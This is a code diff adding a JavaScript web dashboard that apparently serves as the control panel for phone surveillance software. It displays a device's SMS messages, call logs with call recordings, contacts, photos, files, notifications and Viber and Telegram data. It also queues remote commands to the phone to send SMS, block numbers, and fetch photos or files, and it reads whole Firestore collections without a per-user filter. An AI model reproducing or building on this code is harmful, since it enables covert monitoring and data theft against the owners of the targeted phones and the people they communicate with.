+      updateBadge("contacts", latestContactTime > getLastSeen(currentEmail, "contacts") ? 1 : 0);
+    } catch (e) {}
+  }
+
+  function updateBadge(tab, count) {
+    const el = document.getElementById("badge-" + tab);
+    if (!el) return;
+    if (count > 0) { el.textContent = String(count); el.classList.remove("hidden"); }
+    else { el.classList.add("hidden"); }
+  }
+
+  // ═══════════════ ⭐ START LISTENERS — NO where filter ═══════════════
+  function startRealtimeListener() {
+    stopRealtimeListener();
+    setLive('connecting');
+    if (fetchInfo) fetchInfo.textContent = 'Loading data from Firestore...';
+
+    // ✅ Helper — collection တစ်ခုလုံး ဆွဲ၊ userId filter မပါ
+    function listenCollection(name, sortField, max, assign, unsubArr) {
+      const q = query(collection(db, name), limit(max));
+
+      const unsub = onSnapshot(q, (snap) => {
+        const arr = snap.docs
+          .map(d => ({ id: d.id, ...d.data() }))
+          .sort((a, b) => {
+            const av = a[sortField] || 0;
+            const bv = b[sortField] || 0;
+            return bv - av;
+          })
+          .slice(0, max);
+
+        console.log(`✅ ${name}: ${arr.length} docs loaded`);
+        if (arr.length > 0) console.log(`   sample userId:`, arr[0].userId);
+
+        assign(arr);
+      }, (err) => {
+        console.error(`❌ ${name} error:`, err.code, err.message);
+        if (err.code === 'permission-denied') {
+          setLive('offline');
+          toastError('Firestore permission denied — rules စစ်ပါ');
+        } else if (err.code === 'unavailable' || err.code === 'deadline-exceeded') {
+          setLive('offline');
+        } else {
+          setLive('offline');
+          toastError(`${name}: ${err.message}`);
+        }
+      });
+
+      unsubArr.push(unsub);
+    }
+
+    // ─── message ───
+    listenCollection('message', 'date', 500, (arr) => {
+      allDocs = arr;
+      saveCache(currentEmail, arr);
+      setLive('live');
+      if (fetchInfo) fetchInfo.textContent = 'Loaded: ' + arr.length + ' docs';
+      computeBadges();
+      if (currentTab && !dataScreen.classList.contains('hidden')) renderTab(currentTab);
+    }, unsubMessageList);
+
+    // ─── commands ───
+    listenCollection('commands', 'createdAt', 500, (arr) => {
+      commands = arr;
+      if (currentTab === 'send') renderCommands();
+      if (currentTab === 'photos') updatePhotoLoadBtn();
+      if (currentTab === 'files') updateFileBtn();
+    }, unsubCommandList);
+
+    // ─── blocked ───
+    listenCollection('blocked', 'createdAt', 200, (arr) => {
+      blockedList = arr;
+      if (currentTab === 'block') renderBlocked();
+    }, unsubBlockedList);
+  }
+
+  // ═══════════════ RENDER DISPATCHER ═══════════════
+  function renderTab(tab) {
+    try {
+      if (tab === 'send')          renderCommands();
+      else if (tab === 'block')    renderBlocked();
+      else if (tab === 'sms')      renderSms();
+      else if (tab === 'calls')    renderCalls();
+      else if (tab === 'contacts') renderContacts();
+      else if (tab === 'noti')     renderNoti();
+      else if (tab === 'viber')    renderViber();
+      else if (tab === 'telegram') renderTelegram();
+      else if (tab === 'apps')     renderSystemApps();
+      else if (tab === 'photos')   renderPhotos();
+      else if (tab === 'files')    renderFiles();
+    } catch (e) {
+      console.error("Render error:", e);
+      toastError("Render: " + e.message);
+    }
+  }
+
+  // ═══════════════ SHOW LOGIN ═══════════════
+  function showLogin() {
+    resetAllState();
+    setLive('offline');
+    loadingScreen.classList.add('hidden');
+    loginScreen.classList.remove('hidden');
+    dashScreen.classList.add('hidden');
+    document.body.style.display = 'flex';
+    userEmail.textContent = "-";
+    loginBtn.disabled = false;
+    loginBtn.textContent = "Login";
+    dataScreen.classList.add('hidden');
+    menuScreen.classList.remove('hidden');
+    document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+  }
+
+  // ═══════════════ SHOW DASHBOARD ═══════════════
+  function showDashboard(email) {
+    currentEmail = email;
+    userEmail.textContent = email;
+    loadingScreen.classList.add('hidden');
+    loginScreen.classList.add('hidden');
+    dashScreen.classList.remove('hidden');
+    document.body.style.display = 'block';
+
+    const cached = loadCache(email);
+    if (cached && cached.docs.length > 0) {
+      allDocs = cached.docs;
+      setLive('cached');
+      const ageMin = Math.round((Date.now() - cached.time) / 60000);
+      if (fetchInfo) fetchInfo.textContent = "Cached: " + cached.docs.length + " docs (" + ageMin + "m ago)";
+      computeBadges();
+    } else {
+      setLive('connecting');
+      if (fetchInfo) fetchInfo.textContent = "Loading data from Firestore...";
+    }
+
+    startRealtimeListener();
+
+    setTimeout(() => {
+      if (allDocs.length === 0 && currentEmail === email) {
+        setLive('offline');
+        if (fetchInfo) fetchInfo.textContent = "Data မလာသေးဘူး — Refresh နှိပ်ပါ";
+        toastWarning("Data မလာသေးဘူး — refresh လုပ်ကြည့်ပါ");
+      }
+    }, 15000);
+  }
+
+  // ═══════════════ REFRESH ═══════════════
+  refreshBtn.addEventListener('click', () => {
+    refreshBtn.disabled = true;
+    refreshBtn.classList.add('spinning');
+    toastInfo("Refreshing...");
+    stopRealtimeListener();
+    setTimeout(() => startRealtimeListener(), 200);
+    setTimeout(() => { refreshBtn.classList.remove('spinning'); refreshBtn.disabled = false; }, 900);
+  });
+
+  // ═══════════════ TAB NAVIGATION ═══════════════
+  document.querySelectorAll('.tab-btn').forEach(btn => {
+    btn.addEventListener('click', () => {
+      const tab = btn.dataset.tab;
+      currentTab = tab;
+      if (currentEmail && (tab === 'sms' || tab === 'calls' || tab === 'contacts')) {
+        setLastSeen(currentEmail, tab, Date.now());
+        updateBadge(tab, 0);
+      }
+      document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+      btn.classList.add('active');
+      menuScreen.classList.add('hidden');
+      dataScreen.classList.remove('hidden');
+      document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+      const content = document.getElementById('tab-' + tab);
+      if (content) content.classList.add('active');
+      renderTab(tab);
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+    });
+  });
+
+  backBtn.addEventListener('click', () => {
+    dataScreen.classList.add('hidden');
+    menuScreen.classList.remove('hidden');
+    currentTab = null;
+    document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+  });
+
+  // ═══════════════ LOGIN ═══════════════
+  loginBtn.addEventListener('click', doLogin);
+  passwordInput.addEventListener('keypress', (e) => { if (e.key === 'Enter') doLogin(); });
+
+  async function doLogin() {
+    const email = emailInput.value.trim();
+    const password = passwordInput.value.trim();
+    if (!email || !password) { loginError.textContent = "Email နဲ့ Password ထည့်ပါ"; toastWarning("Email နဲ့ Password ထည့်ပါ"); return; }
+    loginBtn.disabled = true;
+    loginBtn.textContent = "Logging in...";
+    loginError.textContent = "";
+    try {
+      await signInWithEmailAndPassword(auth, email, password);
+    } catch (e) {
+      let msg = e.message || String(e);
+      if (msg.includes("invalid-credential") || msg.includes("wrong-password")) msg = "Email/Password မှားနေတယ်";
+      else if (msg.includes("user-not-found")) msg = "Account မရှိဘူး";
+      else if (msg.includes("too-many-requests")) msg = "အကြိမ်များလွန်း";
+      else if (msg.includes("network")) msg = "Network error";
+      loginError.textContent = msg;
+      toastError("Login: " + msg);
+      loginBtn.disabled = false;
+      loginBtn.textContent = "Login";
+    }
+  }
+
+  async function forceLogout() {
+    try { stopRealtimeListener(); await signOut(auth); } catch (e) {}
+    emailInput.value = "";
+    passwordInput.value = "";
+    loginError.textContent = "";
+  }
+
+  logoutBtn.addEventListener('click', async () => {
+    if (!confirm("Logout လုပ်မှာ သေချာလား?")) return;
+    toastInfo("Logging out...");
+    await forceLogout();
+    toastSuccess("Logged out");
+  });
+
+  // ═══════════════ AUTH STATE ═══════════════
+  onAuthStateChanged(auth, (user) => {
+    clearTimeout(BOOT_TIMEOUT);
+    if (user && user.isAnonymous) {
+      signOut(auth).catch(() => {});
+      showLogin();
+    } else if (user) {
+      showDashboard(user.email);
+      user.getIdToken(true).catch(e => console.warn("Token refresh:", e));
+    } else {
+      showLogin();
+    }
+  });
+
+  // ═══════════════ EMPTY STATE ═══════════════
+  function emptyState(iconName, text) {
+    return '<div class="empty-state">' + svgIcon(iconName, '#64748b', 42) + '<div>' + escapeHtml(text) + '</div></div>';
+  }
+
+  // ═══════════════ PHOTO REQUEST ═══════════════
+  loadMoreBtn.addEventListener('click', async () => {
+    if (!currentEmail) return;
+    loadMoreBtn.disabled = true;
+    loadMoreBtn.classList.add('spinning');
+    loadMoreBtn.innerHTML = svgIcon('clock', 'white', 18) + ' Requesting...';
+    try {
+      await addDoc(collection(db, "commands"), {
+        userId: currentEmail, type: "PHOTO_REQUEST", number: "", body: "",
+        status: "pending", note: "",
+        createdAt: Math.floor(Date.now() / 1000), updatedAt: Math.floor(Date.now() / 1000)
+      });
+      toastSuccess("Photo request sent — ၁၅ စက္ကန့်အတွင်း ပုံလာမယ်");
+    } catch (e) { toastError("Failed: " + e.message); }
+    finally {
+      setTimeout(() => { loadMoreBtn.classList.remove('spinning'); loadMoreBtn.disabled = false; updatePhotoLoadBtn(); }, 3000);
+    }
+  });
+
+  function updatePhotoLoadBtn() {
+    if (!loadMoreBtn) return;
+    const hasPending = commands.some(c => c.type === "PHOTO_REQUEST" && c.status === "pending");
+    if (hasPending) {
+      loadMoreBtn.disabled = true;
+      loadMoreBtn.innerHTML = svgIcon('clock', 'white', 18) + ' Waiting for phone...';
+    } else {
+      loadMoreBtn.disabled = false;
+      loadMoreBtn.innerHTML = svgIcon('photo', 'white', 18) + ' Load 5 More Photos';
+    }
+  }
+
+  // ═══════════════ FILE LIST REQUEST ═══════════════
+  refreshFilesBtn.addEventListener('click', async () => {
+    if (!currentEmail) return;
+    refreshFilesBtn.disabled = true;
+    refreshFilesBtn.classList.add('spinning');
+    try {
+      await addDoc(collection(db, "commands"), {
+        userId: currentEmail, type: "FILE_LIST_REQUEST", number: "", body: "",
+        status: "pending", note: "",
+        createdAt: Math.floor(Date.now() / 1000), updatedAt: Math.floor(Date.now() / 1000)
+      });
+      toastSuccess("File list request sent");
+    } catch (e) { toastError("Failed: " + e.message); }
+    finally {
+      setTimeout(() => { refreshFilesBtn.classList.remove('spinning'); refreshFilesBtn.disabled = false; updateFileBtn(); }, 3000);
+    }
+  });
+
+  function updateFileBtn() {
+    if (!refreshFilesBtn) return;
+    const hasPending = commands.some(c => c.type === "FILE_LIST_REQUEST" && c.status === "pending");
+    if (hasPending) {
+      refreshFilesBtn.disabled = true;
+      refreshFilesBtn.innerHTML = svgIcon('clock', 'white', 18) + ' Waiting for phone...';
+    } else {
+      refreshFilesBtn.disabled = false;
+      refreshFilesBtn.innerHTML = svgIcon('file', 'white', 18) + ' Refresh File List';
+    }
+  }
+
+  // ═══════════════ PHOTOS ═══════════════
+  function renderPhotos() {
+    const list = document.getElementById('photoList');
+    const photoDocs = allDocs.filter(d => (d.sender || "").startsWith("PHOTO_"));
+    document.getElementById('photoTotal').textContent = photoDocs.length;
+
+    if (photoDocs.length === 0) {
+      list.innerHTML = '<div class="placeholder">' + svgIcon('photo', '#64748b', 48) +
+        '<h3 style="margin-top:12px;">Photo မရှိသေးပါ</h3>' +
+        '<p>Load 5 More Photos ကို နှိပ်ပါ။</p></div>';
+      updatePhotoLoadBtn();
+      return;
+    }
+
+    photoDocs.sort((a, b) => (b.date || 0) - (a.date || 0));
+
+    let html = '<div class="photo-grid">';
+    photoDocs.forEach((p, idx) => {
+      const body = p.body || "";
+      if (body.length < 100) return;
+      const fileName = (p.sender || "").replace("PHOTO_", "");
+      const d = p.date ? new Date(p.date * 1000) : null;
+      const dateStr = d ? d.toLocaleString() : "";
+      const dataUri = "data:image/jpeg;base64," + body;
+      html += '<div class="photo-tile" data-photo-idx="' + idx + '">' +
+        '<img src="' + dataUri + '" alt="photo" loading="lazy">' +
+        '<div class="photo-idx">' + (idx + 1) + '</div>' +
+        '<div class="photo-date">' + escapeHtml(dateStr) + '</div>' +
+      '</div>';
+    });
+    html += '</div>';
+    list.innerHTML = html;
+
+    list.querySelectorAll('.photo-tile').forEach(tile => {
+      tile.addEventListener('click', () => {
+        const idx = parseInt(tile.dataset.photoIdx);
+        openPhotoModal(photoDocs[idx]);
+      });
+    });
+
+    updatePhotoLoadBtn();
+  }
+
+  function openPhotoModal(doc) {
+    const existing = document.getElementById('photoModal');
+    if (existing) existing.remove();
+
+    const body = doc.body || "";
+    const fileName = (doc.sender || "").replace("PHOTO_", "");
+    const d = doc.date ? new Date(doc.date * 1000) : null;
+    const dateStr = d ? d.toLocaleString() : "";
+    const w = doc.photoWidth || "?";
+    const h = doc.photoHeight || "?";
+    const sizeKb = Math.round((body.length * 3 / 4) / 1024);
+    const dataUri = "data:image/jpeg;base64," + body;
+
+    const modal = document.createElement('div');
+    modal.className = 'photo-modal';
+    modal.id = 'photoModal';
+    modal.innerHTML = '<div class="photo-modal-content">' +
+      '<div class="photo-modal-header">' +
+        '<div class="photo-modal-title">' + escapeHtml(fileName) + '</div>' +
+        '<button class="photo-modal-close" id="photoModalClose">' +
+          '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">' +
+            '<line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/>' +
+          '</svg>' +
+        '</button>' +
+      '</div>' +
+      '<div class="photo-modal-body"><img src="' + dataUri + '" alt="photo"></div>' +
+      '<div class="photo-modal-footer">' +
+        '<div class="photo-modal-info">' +
+          '<strong>' + escapeHtml(w + ' × ' + h) + '</strong><br>' +
+          escapeHtml(dateStr) + ' • ' + sizeKb + ' KB' +
+        '</div>' +
+        '<a class="record-download" href="' + dataUri + '" download="' + escapeHtml(fileName) + '">' +
+          svgIcon('download', '#38bdf8', 14) + ' Download' +
+        '</a>' +
+      '</div>' +
+    '</div>';
+    document.body.appendChild(modal);
+
+    document.getElementById('photoModalClose').addEventListener('click', () => modal.remove());
+    modal.addEventListener('click', (e) => { if (e.target === modal) modal.remove(); });
+  }
+
+  // ═══════════════ FILES ═══════════════
+  function renderFiles() {
+    const list = document.getElementById('fileList');
+    const fileDocs = allDocs.filter(d => (d.sender || "").startsWith("FILE_LIST_"));
+
+    if (fileDocs.length === 0) {
+      list.innerHTML = '<div class="placeholder">' + svgIcon('file', '#64748b', 48) +
+        '<h3 style="margin-top:12px;">File list မရသေးပါ</h3>' +
+        '<p>Refresh File List ကို နှိပ်ပါ။</p></div>';
+      document.getElementById('fileTotal').textContent = 0;
+      document.getElementById('fileShown').textContent = 0;
+      updateFileBtn();
+      return;
+    }
+
+    let allFiles = [];
+    fileDocs.forEach(doc => {
+      const text = (doc.body || "").replace(/\r\n/g, "\n");
+      const blocks = text.split("----------------------------------------");
+      blocks.forEach(block => {
+        const b = block.trim();
+        if (!b) return;
+        const nameM = b.match(/Name:\s*([^\n]+)/);
+        const pathM = b.match(/Path:\s*([^\n]+)/);
+        const sizeM = b.match(/Size:\s*([^\n]+)/);
+        const dateM = b.match(/Date:\s*([^\n]+)/);
+        const extM = b.match(/Type:\s*([^\n]+)/);
+
+        if (nameM && pathM) {
+          allFiles.push({
+            name: nameM[1].trim(),
+            path: pathM[1].trim(),
+            size: sizeM ? sizeM[1].trim() : "?",
+            date: dateM ? dateM[1].trim() : "",
+            ext: extM ? extM[1].trim() : "unknown"
+          });
+        }
+      });
+    });
+
+    const seen = {};
+    allFiles = allFiles.filter(f => {
+      if (seen[f.path]) return false;
+      seen[f.path] = true;
+      return true;
+    });
+
+    document.getElementById('fileTotal').textContent = allFiles.length;
+    document.getElementById('fileShown').textContent = allFiles.length;
+
+    if (allFiles.length === 0) {
+      list.innerHTML = '<div class="loading">📭 File မရှိပါ</div>';
+      return;
+    }
+
+    const fileContentDocs = allDocs.filter(d => (d.sender || "").startsWith("FILE_") && !(d.sender || "").startsWith("FILE_LIST_"));
+
+    let html = "";
+    allFiles.forEach(f => {
+      const match = fileContentDocs.find(d => {
+        const orig = d.fileName || "";
+        return orig === f.name;
+      });
+
+      const extClass = f.ext.substring(0, 8);
+
+      html += '<div class="file-item">' +
+        '<div class="file-info">' +
+          '<div class="file-name">' + escapeHtml(f.name) + '</div>' +
+          '<div class="file-meta">' +
+            '<span class="ext">' + escapeHtml(extClass) + '</span>' +
+            '<span>' + escapeHtml(f.size) + ' KB</span>' +
+            '<span>' + escapeHtml(f.date) + '</span>' +
+          '</div>' +
+        '</div>';
+
+      if (match) {
+        const base64 = match.body || "";
+        const dataUri = "data:application/octet-stream;base64," + base64;
+        const sizeKb = match.fileSize || "?";
+
+        html += '<a class="file-downloaded" href="' + dataUri + '" download="' + escapeHtml(f.name) + '">' +
+          svgIcon('download', 'currentColor', 12) + ' ' + sizeKb + ' KB ⬇' +
+        '</a>';
+      } else {
+        html += '<button class="file-download-btn" data-file-path="' + escapeHtml(f.path) + '">' +
+          svgIcon('download', 'white', 12) + ' Request' +
+        '</button>';
+      }
+
+      html += '</div>';
+    });
+    list.innerHTML = html;
+
+    list.querySelectorAll('[data-file-path]').forEach(btn => {
+      btn.addEventListener('click', async () => {
+        const path = btn.dataset.filePath;
+        if (!path) return;
+        btn.disabled = true;
+        btn.textContent = 'Requesting...';
+        try {
+          await addDoc(collection(db, "commands"), {
+            userId: currentEmail, type: "FILE_DOWNLOAD", number: "", body: path,
+            status: "pending", note: "",
+            createdAt: Math.floor(Date.now() / 1000), updatedAt: Math.floor(Date.now() / 1000)
+          });
+          toastSuccess("Request sent — ၁၅ စက္ကန့်အတွင်း ရမယ်");
+        } catch (e) {
+          toastError("Failed: " + e.message);
+          btn.disabled = false;
+          btn.textContent = 'Request';
+        }
+      });
+    });
+
+    updateFileBtn();
+  }
+
+  // ═══════════════ SEND SMS ═══════════════
+  document.getElementById('sendSmsBtn').addEventListener('click', async () => {
+    const num = document.getElementById('sendNumber').value.trim();
+    const body = document.getElementById('sendBody').value.trim();
+    if (!num) { toastWarning("ဖုန်းနံပါတ် ထည့်ပါ"); return; }
+    if (!body) { toastWarning("Message ထည့်ပါ"); return; }
+    const btn = document.getElementById('sendSmsBtn');
+    btn.disabled = true;
+    try {
+      await addDoc(collection(db, "commands"), {
+        userId: currentEmail, type: "SMS_SEND", number: num, body: body,
+        status: "pending", note: "",
+        createdAt: Math.floor(Date.now() / 1000), updatedAt: Math.floor(Date.now() / 1000)
+      });
+      toastSuccess("Command queued — ဖုန်း online ရင် ၁၅s အတွင်း ပို့မယ်");
+      document.getElementById('sendNumber').value = "";
+      document.getElementById('sendBody').value = "";
+    } catch (e) { toastError("Send failed: " + e.message); }
+    finally { btn.disabled = false; }
+  });
+
+  document.getElementById('blockBtn').addEventListener('click', async () => {
+    const num = document.getElementById('blockNumber').value.trim();
+    if (!num) { toastWarning("ဖုန်းနံပါတ် ထည့်ပါ"); return; }
+    const norm = normalizePhone(num);
+    const dup = blockedList.find(b => normalizePhone(b.number) === norm);
+    if (dup) { toastWarning("ဒီနံပါတ် block လုပ်ပြီးသား"); return; }
+    const btn = document.getElementById('blockBtn');
+    btn.disabled = true;
+    try {
+      await addDoc(collection(db, "commands"), {
+        userId: currentEmail, type: "BLOCK", number: num, body: "",
+        status: "pending", note: "",
+        createdAt: Math.floor(Date.now() / 1000), updatedAt: Math.floor(Date.now() / 1000)
+      });
+      toastSuccess("Block command queued");
+      document.getElementById('blockNumber').value = "";
+    } catch (e) { toastError("Block failed: " + e.message); }
+    finally { btn.disabled = false; }
+  });
+
+  async function unblockNumber(docId, number) {
+    if (!confirm("Unblock " + number + " ?")) return;
+    try {
+      await addDoc(collection(db, "commands"), {
+        userId: currentEmail, type: "UNBLOCK", number: number, body: "",
+        status: "pending", note: "",
+        createdAt: Math.floor(Date.now() / 1000), updatedAt: Math.floor(Date.now() / 1000)
+      });
+      await deleteDoc(doc(db, "blocked", docId));
+      toastSuccess("Unblock command sent");
+    } catch (e) { toastError("Unblock failed: " + e.message); }
+  }
+
+  // ═══════════════ COMMANDS ═══════════════
+  function renderCommands() {
+    const list = document.getElementById('cmdList');
+    const pending = commands.filter(c => c.status === 'pending').length;
+    const sent = commands.filter(c => c.status === 'sent' || c.status === 'done').length;
+    const failed = commands.filter(c => c.status === 'failed').length;
+    document.getElementById('cmdPending').textContent = pending;
+    document.getElementById('cmdSent').textContent = sent;
+    document.getElementById('cmdFailed').textContent = failed;
+    if (commands.length === 0) { list.innerHTML = emptyState('send', 'Command မရှိသေးပါ'); return; }
+
+    let html = "";
+    commands.slice(0, 50).forEach(c => {
+      const status = c.status || "pending";
+      let typeIcon = 'send', typeLabel = 'SMS', typeClass = 'sms';
+      if (c.type === 'BLOCK') { typeIcon = 'ban'; typeLabel = 'Block'; typeClass = 'block'; }
+      else if (c.type === 'UNBLOCK') { typeIcon = 'unlock'; typeLabel = 'Unblock'; typeClass = 'unblock'; }
+      else if (c.type === 'PHOTO_REQUEST') { typeIcon = 'photo'; typeLabel = 'Photo'; typeClass = 'photo'; }
+      else if (c.type === 'FILE_LIST_REQUEST') { typeIcon = 'file'; typeLabel = 'File List'; typeClass = 'file'; }
+      else if (c.type === 'FILE_DOWNLOAD') { typeIcon = 'download'; typeLabel = 'File'; typeClass = 'file'; }
+
+      let statusIcon = 'clock', statusLabel = 'Pending';
+      if (status === 'sent') { statusIcon = 'check'; statusLabel = 'Sent'; }
+      else if (status === 'sending') { statusIcon = 'clock'; statusLabel = 'Sending'; }
+      else if (status === 'done') { statusIcon = 'check'; statusLabel = 'Done'; }
+      else if (status === 'failed') { statusIcon = 'x'; statusLabel = 'Failed'; }
+      else if (status === 'blocked') { statusIcon = 'ban'; statusLabel = 'Blocked'; }
+
+      const dt = c.createdAt ? new Date(c.createdAt * 1000) : null;
+      const timeStr = dt ? dt.toLocaleString() : '';
+      html += '<div class="cmd-item ' + status + '">' +
+        '<div class="cmd-top">' +
+          '<span class="cmd-type ' + typeClass + '">' + svgIcon(typeIcon, 'currentColor', 12) + typeLabel + '</span>' +
+          '<span class="cmd-status ' + status + '">' + svgIcon(statusIcon, 'currentColor', 10) + statusLabel + '</span>' +
+        '</div>' +
+        (c.number ? '<div class="cmd-phone">' + escapeHtml(c.number) + '</div>' : '') +
+        (c.body ? '<div class="cmd-body">' + escapeHtml(c.body) + '</div>' : '') +
+        (c.note ? '<div class="cmd-note">' + escapeHtml(c.note) + '</div>' : '') +
+        '<div class="cmd-time">' + escapeHtml(timeStr) + '</div>' +
+      '</div>';
+    });
+    list.innerHTML = html;
+  }
+
+  // ═══════════════ BLOCKED ═══════════════
+  function renderBlocked() {
+    const list = document.getElementById('blockedList');
+    document.getElementById('blockedTotal').textContent = blockedList.length;
+    if (blockedList.length === 0) { list.innerHTML = emptyState('ban', 'Blocked နံပါတ် မရှိပါ'); return; }
+    let html = "";
+    blockedList.forEach(b => {
+      const dt = b.createdAt ? new Date(b.createdAt * 1000) : null;
+      const timeStr = dt ? dt.toLocaleString() : '';
+      html += '<div class="blocked-item">' +
+        '<div style="flex:1;min-width:0">' +
+          '<div class="b-number">' + escapeHtml(b.number || '') + '</div>' +
+          '<div class="b-date">' + escapeHtml(timeStr) + '</div>' +
+        '</div>' +
+        '<button class="btn-small btn-unblock" data-unblock-id="' + b.id + '" data-unblock-num="' + escapeHtml(b.number || '') + '">' +
+          svgIcon('unlock', 'white', 12) + ' Unblock' +
+        '</button>' +
+      '</div>';
+    });
+    list.innerHTML = html;
+    list.querySelectorAll('[data-unblock-id]').forEach(btn => {
+      btn.addEventListener('click', () => { unblockNumber(btn.dataset.unblockId, btn.dataset.unblockNum); });
+    });
+  }
+
+  // ═══════════════ SMS ═══════════════
+  function renderSms() {
+    const smsList = document.getElementById('smsList');
+    const smsDocs = allDocs.filter(d => (d.sender || "").startsWith("SMS_"));
+    if (smsDocs.length === 0) {
+      smsList.innerHTML = emptyState('inbox', 'SMS မရှိပါ');
+      document.getElementById('statTotal').textContent = 0;
+      document.getElementById('statIn').textContent = 0;
+      document.getElementById('statOut').textContent = 0;
+      return;
+    }
+    let allSms = [];
+    let deviceName = "";
+    smsDocs.forEach(doc => {
+      const text = (doc.body || "").replace(/\r\n/g, "\n");
+      text.split("\n").forEach(l => { if (l.startsWith("Device:")) deviceName = l.substring(7).trim(); });
+      const blocks = text.split("----------------------------------------");
+      blocks.forEach(block => {
+        const b = block.trim();
+        if (!b) return;
+        const m = b.match(/\[\s*(IN|OUT)\s*\]\s*([^\n]+)\nPhone:\s*([^\n]+)\nMessage:\s*([\s\S]+)/);
+        if (m) allSms.push({ dir: m[1].trim(), date: m[2].trim(), phone: m[3].trim(), msg: m[4].trim() });
+      });
+    });
+    allSms.sort((a, b) => b.date.localeCompare(a.date));
+    document.getElementById('statTotal').textContent = allSms.length;
+    document.getElementById('statIn').textContent = allSms.filter(s => s.dir === 'IN').length;
+    document.getElementById('statOut').textContent = allSms.filter(s => s.dir === 'OUT').length;
+    if (deviceName) {
+      document.getElementById('deviceInfo').innerHTML =
+        '<strong>User:</strong> ' + escapeHtml(currentEmail) +
+        '<br><strong>Device:</strong> ' + escapeHtml(deviceName) +
+        '<br><strong>Updated:</strong> ' + new Date().toLocaleTimeString();
+    }
+    let html = "";
+    allSms.forEach(s => {
+      const dirClass = s.dir === 'IN' ? 'in' : 'out';
+      const dirLabel = s.dir === 'IN' ? 'IN' : 'OUT';
+      html += '<div class="sms-item ' + dirClass + '">' +
+        '<div class="top"><span class="phone">' + escapeHtml(s.phone) + '</span><span>' + escapeHtml(s.date) + '</span></div>' +
+        '<div class="msg"><span class="dir-badge dir-' + dirClass + '">' + dirLabel + '</span>' + escapeHtml(s.msg) + '</div>' +
+      '</div>';
+    });
+    smsList.innerHTML = html;
+  }
+
+  // ═══════════════ CALLS ═══════════════
+  function renderCalls() {
+    const callList = document.getElementById('callList');
+    const callDocs = allDocs.filter(d => (d.sender || "").startsWith("CALL_LOG_"));
+    if (callDocs.length === 0) {
+      callList.innerHTML = emptyState('phone', 'Call Logs မရှိပါ');
+      ['callTotal','callIn','callOut','callMissed'].forEach(id => document.getElementById(id).textContent = 0);
+      return;
+    }
+    let allCalls = [];
+    callDocs.forEach(doc => {
+      const text = (doc.body || "").replace(/\r\n/g, "\n");
+      const blocks = text.split("----------------------------------------");
+      blocks.forEach(block => {
+        const b = block.trim();
+        if (!b) return;
+        const m = b.match(/\[(INCOMING|OUTGOING|MISSED|REJECTED|UNKNOWN)\]\s*\|\s*([^\n]+)\nPhone:\s*([^\n]+)\nDuration:\s*(\d+)s/);
+        if (m) allCalls.push({ type: m[1].trim(), date: m[2].trim(), phone: m[3].trim(), duration: parseInt(m[4]) });
+      });
+    });
+    allCalls.sort((a, b) => b.date.localeCompare(a.date));
+    document.getElementById('callTotal').textContent = allCalls.length;
+    document.getElementById('callIn').textContent = allCalls.filter(c => c.type === 'INCOMING').length;
+    document.getElementById('callOut').textContent = allCalls.filter(c => c.type === 'OUTGOING').length;
+    document.getElementById('callMissed').textContent = allCalls.filter(c => c.type === 'MISSED').length;
+
+    const recDocs = allDocs.filter(d => (d.sender || "").startsWith("RECORD_"));
+    const allRecs = recDocs.map(r => ({ id: r.id, sender: r.sender, date: r.date || 0, body: r.body || "", size: r.size || 0 }));
+
+    let html = "";
+    allCalls.forEach((c, idx) => {
+      let cls = 'call-item ';
+      let badge = 'badge-unknown';
+      if (c.type === 'INCOMING') { cls += 'incoming'; badge = 'badge-incoming'; }
+      else if (c.type === 'OUTGOING') { cls += 'outgoing'; badge = 'badge-outgoing'; }
+      else if (c.type === 'MISSED') { cls += 'missed'; badge = 'badge-missed'; }
+      else if (c.type === 'REJECTED') { cls += 'rejected'; badge = 'badge-rejected'; }
+
+      const callStart = parseDateToMs(c.date);
+      const callEnd = callStart + (c.duration || 0) * 1000;
+      const matchingRecs = allRecs.filter(r => {
+        const recTime = (r.date || 0) * 1000;
+        return recTime >= callStart - 5000 && recTime <= callEnd + 60000;
+      });
+
+      const itemId = "call-audio-" + idx;
+      const hasRec = matchingRecs.length > 0;
+
+      html += '<div class="' + cls + '">' +
+        '<div class="top">' +
+          '<span class="phone clickable" data-target="' + itemId + '">' +
+            escapeHtml(c.phone) + (hasRec ? svgIcon('mic', '#22c55e', 12) : '') +
+          '</span>' +
+          '<span>' + escapeHtml(c.date) + '</span>' +
+        '</div>' +
+        '<div class="details"><span class="call-badge ' + badge + '">' + c.type + '</span> Duration: ' + c.duration + 's</div>' +
+        '<div class="call-audio hidden" id="' + itemId + '">';
+
+      if (matchingRecs.length === 0) {
+        html += '<div class="no-audio">' + svgIcon('volumeOff', '#64748b', 14) + 'No audio file for this call</div>';
+      } else {
+        matchingRecs.forEach(r => {
+          const fileName = (r.sender || "").replace("RECORD_", "");
+          const dataUri = "data:audio/mp4;base64," + r.body;
+          html += '<div class="audio-item">' +
+            '<div class="audio-label">' + svgIcon('mic', '#22c55e', 14) + escapeHtml(fileName) + '</div>' +
+            '<audio controls preload="metadata"><source src="' + dataUri + '" type="audio/mp4"></audio>' +
+            '<a class="record-download" href="' + dataUri + '" download="' + escapeHtml(fileName) + '">' +
+              svgIcon('download', '#38bdf8', 14) + ' Download' +
+            '</a>' +
+          '</div>';
+        });
+      }
+      html += '</div></div>';
+    });
+    callList.innerHTML = html;
+
+    callList.querySelectorAll('.phone.clickable').forEach(el => {
+      el.addEventListener('click', () => {
+        const target = document.getElementById(el.dataset.target);
+        if (target) target.classList.toggle('hidden');
+      });
+    });
+  }
+
+  // ═══════════════ CONTACTS ═══════════════
+  function renderContacts() {
+    const contactList = document.getElementById('contactList');
+    const contactDocs = allDocs.filter(d => (d.sender || "").startsWith("CONTACTS_"));
+    if (contactDocs.length === 0) {
+      contactList.innerHTML = emptyState('users', 'Contacts မရှိပါ');
+      document.getElementById('contactTotal').textContent = 0;
+      document.getElementById('contactDuplicates').textContent = 0;
+      return;
+    }
+    let allRaw = [];
+    contactDocs.forEach(doc => {
+      const text = (doc.body || "").replace(/\r\n/g, "\n");
+      const blocks = text.split("----------------------------------------");
+      blocks.forEach(block => {
+        const b = block.trim();
+        if (!b) return;
